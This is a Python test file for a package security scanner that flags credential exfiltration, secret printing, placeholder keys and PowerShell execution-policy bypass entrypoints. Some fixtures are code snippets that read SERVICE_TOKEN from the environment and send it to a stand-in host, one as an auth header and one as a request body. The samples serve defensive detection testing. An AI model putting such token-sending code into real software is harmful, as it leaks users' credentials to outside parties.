"""Standalone distribution tests: source examples are inspected, never executed."""

import unittest

import test_real_package_regressions as original

MODULE = original.MODULE


class MulticategoryRegressions(unittest.TestCase):
    scan = original.RealPackageRegressions.scan

    def test_auth_header_wrapper_preserves_parameter_purpose(self):
        report = self.scan(
            {
                "main.py": "import os, urllib.request\ndef send(url, key):\n    req=urllib.request.Request(url)\n    req.add_header('Authorization',key)\n    return urllib.request.urlopen(req)\nsend(key=os.getenv('SERVICE_TOKEN'),url='https://service.invalid')"
            }
        )
        risks = [
            f for f in report["findings"] if f["rule_id"] == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
        ]
        self.assertTrue(risks)
        self.assertTrue(all(f["disposition"] == "candidate" for f in risks))

    def test_plain_secret_payload_stays_d(self):
        report = self.scan(
            {
                "main.py": "import os, urllib.request\nreq=urllib.request.Request('https://service.invalid',data=os.getenv('SERVICE_TOKEN').encode())\nurllib.request.urlopen(req)"
            }
        )
        self.assertEqual(report["local_grade_preview"], "D")

    def test_sensitive_output_has_redacted_evidence(self):
        report = self.scan({"main.py": "import os\nprint(os.getenv('ACCESS_TOKEN'))"})
        risks = [f for f in report["findings"] if f["rule_id"] == "QINDUN.D5.CREDENTIAL_OUTPUT"]
        self.assertTrue(risks)
        self.assertEqual(risks[0]["dimension"], "D5")
        self.assertEqual(report["local_grade_preview"], "C")
        self.assertIn("脱敏", risks[0]["evidence"])

    def test_placeholders_and_attribute_reads_do_not_claim_secret_leakage(self):
        report = self.scan(
            {
                "usage.md": 'apiKey: "OPENAI_KEY_HERE"\nAUTH_TOKEN=your_auth_token_here\npsql "postgresql://user:pass@localhost/mydb"',
                "main.py": "api_key=args.api_key or os.environ.get('OPENAI_API_KEY')",
            }
        )
        self.assertEqual(report["local_grade_preview"], "B")

    def test_runtime_connection_credentials_still_need_review(self):
        self.assertEqual(
            self.scan({"settings.txt": "postgresql://user:pass@localhost/mydb"})[
                "local_grade_preview"
            ],
            "C",
        )

    def test_entrypoint_options_and_versions(self):
        for text in [
            "- bash 4+",
            "- Python 3.11+",
            '```powershell\npowershell -ExecutionPolicy ByPass -c "Write-Output ok"\n```',
        ]:
            self.assertEqual(MODULE._instruction_entrypoint_roles("SKILL.md", text), {})
        self.assertEqual(
            MODULE._instruction_entrypoint_roles(
                "SKILL.md",
                "```powershell\npowershell -ExecutionPolicy ByPass -File scripts/main.ps1\n```",
            ),
            {"scripts/main.ps1": "powershell"},
        )

    def test_invalid_quoted_continuation_and_valid_block(self):
        self.assertFalse(
            MODULE._frontmatter_valid('---\nname: sample\ndescription: "quoted"\n  invalid\n---\n')
        )
        self.assertTrue(
            MODULE._frontmatter_valid("---\nname: sample\ndescription: |\n  valid block\n---\n")
        )


if __name__ == "__main__":
    unittest.main()
